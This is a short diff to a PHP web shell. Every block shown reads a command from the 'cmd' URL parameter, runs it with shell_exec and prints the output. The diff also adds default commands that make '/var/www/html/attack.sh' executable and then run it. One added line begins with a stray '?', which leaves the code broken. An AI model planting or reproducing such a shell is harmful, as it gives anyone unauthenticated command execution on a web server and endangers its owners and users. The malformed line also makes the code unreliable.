@@ -20,7 +20,12 @@ echo "Executing shell command:-> $cmd</br>";
 $output = shell_exec($cmd);
 echo "<pre>$output</pre>";
 
-$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '/var/www/html/attack.sh';
+$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : 'chmod +x /var/www/html/attack.sh';
+echo "Executing shell command:-> $cmd</br>";
+$output = shell_exec($cmd);
+echo "<pre>$output</pre>";
+
+?$cmd = isset($_GET['cmd']) ? $_GET['cmd'] : '/var/www/html/attack.sh';
 echo "Executing shell command:-> $cmd</br>";
 $output = shell_exec($cmd);
 echo "<pre>$output</pre>";
